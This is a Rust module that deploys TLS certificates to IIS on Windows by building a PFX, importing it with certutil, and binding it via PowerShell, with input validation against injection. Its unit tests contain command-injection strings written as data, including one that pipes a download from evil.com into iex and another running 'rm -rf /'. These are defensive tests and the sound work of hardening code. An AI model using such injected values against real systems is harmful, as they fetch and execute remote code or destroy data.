//! IIS (Internet Information Services) deployer — Windows only.
//!
//! Uses PowerShell commands to manage IIS HTTPS bindings,
//! import certificates to the Windows certificate store,
//! and handle backup/rollback of IIS site configurations.

use anyhow::{anyhow, Context, Result};
use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;

use super::backup::{self, BackupManifest};
use super::WebServerDeployer;

use p12::PFX;

/// IIS web server deployer (Windows only).
pub struct IisDeployer;

/// Wrap a SEC1 EC private key in PKCS#8 PrivateKeyInfo for P-256.
///
/// PKCS#8 PrivateKeyInfo ::= SEQUENCE {
///   version INTEGER (0),
///   privateKeyAlgorithm AlgorithmIdentifier { ecPublicKey, prime256v1 },
///   privateKey OCTET STRING containing SEC1 ECPrivateKey
/// }
fn sec1_to_pkcs8_p256(sec1_der: &[u8]) -> Result<Vec<u8>> {
    // OID 1.2.840.10045.2.1 (ecPublicKey)
    let ec_oid: &[u8] = &[0x06, 0x07, 0x2A, 0x86, 0x48, 0xCE, 0x3D, 0x02, 0x01];
    // OID 1.2.840.10045.3.1.7 (prime256v1 / P-256)
    let p256_oid: &[u8] = &[0x06, 0x08, 0x2A, 0x86, 0x48, 0xCE, 0x3D, 0x03, 0x01, 0x07];

    // version INTEGER 0
    let version: &[u8] = &[0x02, 0x01, 0x00];

    // AlgorithmIdentifier SEQUENCE { ecPublicKey OID, prime256v1 OID }
    let algo_content_len = ec_oid.len() + p256_oid.len();
    let mut algo_id = vec![0x30]; // SEQUENCE tag
    push_der_length(&mut algo_id, algo_content_len);
    algo_id.extend_from_slice(ec_oid);
    algo_id.extend_from_slice(p256_oid);

    // privateKey OCTET STRING wrapping the SEC1 key
    let mut priv_key_octet = vec![0x04]; // OCTET STRING tag
    push_der_length(&mut priv_key_octet, sec1_der.len());
    priv_key_octet.extend_from_slice(sec1_der);

    // Outer SEQUENCE
    let total_content_len = version.len() + algo_id.len() + priv_key_octet.len();
    let mut pkcs8 = vec![0x30]; // SEQUENCE tag
    push_der_length(&mut pkcs8, total_content_len);
    pkcs8.extend_from_slice(version);
    pkcs8.extend_from_slice(&algo_id);
    pkcs8.extend_from_slice(&priv_key_octet);

    Ok(pkcs8)
}

/// Push a DER length encoding.
fn push_der_length(buf: &mut Vec<u8>, len: usize) {
    if len < 0x80 {
        buf.push(len as u8);
    } else if len < 0x100 {
        buf.push(0x81);
        buf.push(len as u8);
    } else {
        buf.push(0x82);
        buf.push((len >> 8) as u8);
        buf.push((len & 0xFF) as u8);
    }
}

/// Validate that a string is safe for embedding in a PowerShell single-quoted string.
/// Single-quoted strings in PowerShell don't interpret variables or escape sequences,
/// but a single quote itself would break out. We also reject semicolons and other
/// shell metacharacters for defense-in-depth.
fn is_safe_ps_value(s: &str) -> bool {
    !s.is_empty()
        && s.bytes()
            .all(|b| b.is_ascii_alphanumeric() || b == b'.' || b == b'-' || b == b'_')
}

/// Validate a certificate thumbprint (hex string).
fn is_valid_thumbprint(s: &str) -> bool {
    !s.is_empty() && s.len() <= 128 && s.bytes().all(|b| b.is_ascii_hexdigit())
}

/// Escape a string for use inside PowerShell single-quoted strings.
/// In PS single-quoted strings, the only escape is '' for a literal '.
#[allow(dead_code)]
fn ps_escape_single_quote(s: &str) -> String {
    s.replace('\'', "''")
}

impl IisDeployer {
    pub fn new() -> Self {
        Self
    }

    /// Run a PowerShell command and return stdout.
    fn powershell(&self, script: &str) -> Result<String> {
        let output = Command::new("powershell")
            .args(["-NoProfile", "-NonInteractive", "-Command", script])
            .output()
            .context("Failed to run PowerShell command")?;

        if !output.status.success() {
            let stderr = String::from_utf8_lossy(&output.stderr);
            return Err(anyhow!("PowerShell error:\n{}", stderr));
        }

        Ok(String::from_utf8_lossy(&output.stdout).trim().to_string())
    }

    /// Convert PEM cert + key to PFX for Windows import (pure Rust, no openssl dependency).
    fn create_pfx(&self, cert_path: &Path, key_path: &Path, pfx_path: &Path) -> Result<()> {
        let cert_pem = fs::read_to_string(cert_path)
            .with_context(|| format!("Failed to read certificate: {}", cert_path.display()))?;
        let key_pem = fs::read_to_string(key_path)
            .with_context(|| format!("Failed to read private key: {}", key_path.display()))?;

        // Parse PEM blocks — cert file may contain multiple certs (chain)
        let cert_pems: Vec<pem::Pem> = pem::parse_many(&cert_pem)
            .map_err(|e| anyhow!("Failed to parse certificate PEM: {}", e))?;
        let key_pems =
            pem::parse_many(&key_pem).map_err(|e| anyhow!("Failed to parse key PEM: {}", e))?;

        if cert_pems.is_empty() {
            return Err(anyhow!("No certificate found in {}", cert_path.display()));
        }
        let key_pem_block = key_pems
            .first()
            .ok_or_else(|| anyhow!("No key found in {}", key_path.display()))?;

        let cert_der = &cert_pems[0].contents();
        let sec1_key_der = key_pem_block.contents();

        // The p12 crate expects PKCS#8 DER, but our key is SEC1 ("EC PRIVATE KEY").
        // Wrap SEC1 in PKCS#8 PrivateKeyInfo structure for P-256:
        //   SEQUENCE {
        //     INTEGER 0 (version)
        //     SEQUENCE { OID ecPublicKey, OID prime256v1 }
        //     OCTET STRING { <SEC1 ECPrivateKey> }
        //   }
        let pkcs8_key_der = sec1_to_pkcs8_p256(sec1_key_der)?;

        // If there's a CA cert in the chain, include it
        let ca_contents;
        let ca_der = if cert_pems.len() > 1 {
            ca_contents = cert_pems[1].contents().to_vec();
            Some(ca_contents.as_slice())
        } else {
            None
        };

        let pfx = PFX::new(cert_der, &pkcs8_key_der, ca_der, "", "pki-cert")
            .ok_or_else(|| anyhow!("Failed to build PFX/PKCS#12 from cert and key"))?;

        crate::util::write_sensitive_file(pfx_path, pfx.to_der())
            .with_context(|| format!("Failed to write PFX: {}", pfx_path.display()))?;

        Ok(())
    }

    /// Get the current HTTPS binding thumbprint for a site.
    fn get_current_thumbprint(&self, site_name: &str) -> Result<Option<String>> {
        if !is_safe_ps_value(site_name) {
            return Err(anyhow!("Invalid IIS site name: '{}'", site_name));
        }
        let script = format!(
            "Get-WebBinding -Name '{}' -Protocol https | Select-Object -ExpandProperty certificateHash",
            site_name
        );
        let result = self.powershell(&script)?;
        if result.is_empty() {
            Ok(None)
        } else {
            Ok(Some(result))
        }
    }
}

impl WebServerDeployer for IisDeployer {
    fn detect(&self) -> Result<bool> {
        let result = self.powershell(
            "if (Get-Command Get-Website -ErrorAction SilentlyContinue) { 'yes' } else { 'no' }",
        );
        Ok(result.map(|r| r == "yes").unwrap_or(false))
    }

    fn backup(&self, domain: &str, backup_dir: &Path) -> Result<BackupManifest> {
        if !is_safe_ps_value(domain) {
            return Err(anyhow!(
                "Invalid domain for IIS backup: '{}'. Only alphanumeric, dots, hyphens, and underscores are allowed.",
                domain
            ));
        }

        let (dir, id) = backup::create_backup_dir(backup_dir)?;
        let mut files = Vec::new();

        // Export current IIS binding info
        let binding_info = self.powershell(&format!(
            "Get-WebBinding -Protocol https | Where-Object {{ $_.bindingInformation -like '*{}*' }} | ConvertTo-Json",
            domain
        )).unwrap_or_default();

        let info_path = dir.join("iis-binding-info.json");
        fs::write(&info_path, &binding_info)?;
        files.push(super::backup::BackedUpFile {
            original: PathBuf::from("__iis_binding_info__"),
            backup_name: "iis-binding-info.json".to_string(),
        });

        // Export current cert thumbprint
        if let Ok(Some(thumbprint)) = self.get_current_thumbprint("Default_Web_Site") {
            let thumb_path = dir.join("thumbprint.txt");
            fs::write(&thumb_path, &thumbprint)?;
            files.push(super::backup::BackedUpFile {
                original: PathBuf::from("__iis_cert_thumbprint__"),
                backup_name: "thumbprint.txt".to_string(),
            });
        }

        let manifest = BackupManifest {
            id,
            timestamp: chrono::Utc::now(),
            server_type: "iis".to_string(),
            domain: domain.to_string(),
            files,
            backup_dir: dir,
        };
        manifest.save()?;
        Ok(manifest)
    }

    fn deploy_cert(
        &self,
        cert_path: &Path,
        key_path: &Path,
        _chain_path: Option<&Path>,
        domain: &str,
    ) -> Result<()> {
        if !is_safe_ps_value(domain) {
            return Err(anyhow!(
                "Invalid domain for IIS deployment: '{}'. Only alphanumeric, dots, hyphens, and underscores are allowed.",
                domain
            ));
        }

        // Create PFX from cert + key
        let pfx_dir = dirs::home_dir()
            .ok_or_else(|| anyhow!("Cannot determine home directory"))?
            .join(".pki-client")
            .join("certs")
            .join(domain);
        fs::create_dir_all(&pfx_dir)?;

        let pfx_path = pfx_dir.join("cert.pfx");
        self.create_pfx(cert_path, key_path, &pfx_path)?;

        // Import PFX to Windows cert store using certutil (works on all Windows versions)
        let certutil_output = Command::new("certutil")
            .args(["-importpfx", "-p", "", &pfx_path.to_string_lossy()])
            .output()
            .context("Failed to run certutil. Is it available?")?;

        // Clean up PFX file immediately after import
        let _ = fs::remove_file(&pfx_path);

        if !certutil_output.status.success() {
            let stderr = String::from_utf8_lossy(&certutil_output.stderr);
            let stdout = String::from_utf8_lossy(&certutil_output.stdout);
            return Err(anyhow!("certutil import failed:\n{}\n{}", stdout, stderr));
        }

        // Extract thumbprint: look up the cert we just imported by domain name
        let thumbprint = self.powershell(&format!(
            "Get-ChildItem Cert:\\LocalMachine\\My | Where-Object {{ $_.Subject -like '*{}*' }} \
             | Sort-Object NotAfter -Descending | Select-Object -First 1 -ExpandProperty Thumbprint",
            domain
        ))?;

        if thumbprint.is_empty() {
            return Err(anyhow!(
                "Certificate imported but could not find it in the store for domain '{}'",
                domain
            ));
        }

        // Validate thumbprint is hex-only before using in script
        if !is_valid_thumbprint(&thumbprint) {
            return Err(anyhow!(
                "Unexpected thumbprint format from cert store: '{}'",
                thumbprint
            ));
        }

        // Bind certificate to IIS site
        let bind_script = format!(
            "New-WebBinding -Name 'Default Web Site' -Protocol https -Port 443 -HostHeader '{}' -SslFlags 1; \
             $cert = Get-ChildItem -Path Cert:\\LocalMachine\\My\\{}; \
             $binding = Get-WebBinding -Name 'Default Web Site' -Protocol https -HostHeader '{}'; \
             $binding.AddSslCertificate($cert.Thumbprint, 'My')",
            domain, thumbprint, domain
        );
        self.powershell(&bind_script)?;

        Ok(())
    }

    fn test_config(&self) -> Result<()> {
        let result = self.powershell(
            "Get-Website | Where-Object { $_.State -eq 'Started' } | Select-Object -First 1 -ExpandProperty Name",
        )?;

        if result.is_empty() {
            return Err(anyhow!("No running IIS sites found"));
        }

        Ok(())
    }

    fn reload(&self) -> Result<()> {
        // IIS picks up cert store changes and binding updates automatically.
        // Restart only the Default Web Site instead of iisreset (which kills all sites).
        self.powershell("Restart-WebItem 'IIS:\\Sites\\Default Web Site'")?;
        Ok(())
    }

    fn rollback(&self, manifest: &BackupManifest) -> Result<()> {
        // Validate domain from manifest
        if !is_safe_ps_value(&manifest.domain) {
            return Err(anyhow!(
                "Invalid domain in backup manifest: '{}'",
                manifest.domain
            ));
        }

        let thumbprint_file = manifest.backup_dir.join("thumbprint.txt");
        if thumbprint_file.exists() {
            let old_thumbprint = fs::read_to_string(&thumbprint_file)?.trim().to_string();
            if !old_thumbprint.is_empty() {
                // Validate thumbprint before using in script
                if !is_valid_thumbprint(&old_thumbprint) {
                    return Err(anyhow!(
                        "Invalid thumbprint in backup: '{}'",
                        old_thumbprint
                    ));
                }

                let script = format!(
                    "$binding = Get-WebBinding -Name 'Default Web Site' -Protocol https -HostHeader '{}'; \
                     $binding.AddSslCertificate('{}', 'My')",
                    manifest.domain, old_thumbprint
                );
                self.powershell(&script)?;
            }
        }

        self.reload()?;
        Ok(())
    }

    fn name(&self) -> &str {
        "IIS"
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_is_safe_ps_value_valid() {
        assert!(is_safe_ps_value("example.com"));
        assert!(is_safe_ps_value("sub-domain.example.com"));
        assert!(is_safe_ps_value("Default_Web_Site"));
        assert!(is_safe_ps_value("a"));
        assert!(is_safe_ps_value("my.site-name_01"));
    }

    #[test]
    fn test_is_safe_ps_value_rejects_injection() {
        // Single quote breaks PS string
        assert!(!is_safe_ps_value(
            "'; Invoke-WebRequest http://evil.com | iex; echo '"
        ));
        // Semicolon for command chaining
        assert!(!is_safe_ps_value("a; rm -rf /"));
        // Empty string
        assert!(!is_safe_ps_value(""));
        // Spaces
        assert!(!is_safe_ps_value("Default Web Site"));
        // Backtick (PS escape character)
        assert!(!is_safe_ps_value("a`whoami"));
        // Dollar sign (PS variable)
        assert!(!is_safe_ps_value("$env:PATH"));
        // Pipe
        assert!(!is_safe_ps_value("a|b"));
        // Parentheses
        assert!(!is_safe_ps_value("a(b)"));
        // Ampersand
        assert!(!is_safe_ps_value("a&b"));
    }

    #[test]
    fn test_is_valid_thumbprint() {
        assert!(is_valid_thumbprint("ABC123"));
        assert!(is_valid_thumbprint("abcdef0123456789"));
        assert!(is_valid_thumbprint("A1B2C3D4E5F6"));
        // Reject non-hex
        assert!(!is_valid_thumbprint("GHIJKL"));
        assert!(!is_valid_thumbprint("abc xyz"));
        assert!(!is_valid_thumbprint(""));
        // Reject injection via thumbprint
        assert!(!is_valid_thumbprint("'; evil; '"));
    }

    #[test]
    fn test_ps_escape_single_quote() {
        assert_eq!(ps_escape_single_quote("hello"), "hello");
        assert_eq!(ps_escape_single_quote("it's"), "it''s");
        assert_eq!(
            ps_escape_single_quote("C:\\Users\\O'Brien\\cert.pfx"),
            "C:\\Users\\O''Brien\\cert.pfx"
        );
        assert_eq!(ps_escape_single_quote("''"), "''''");
    }
}
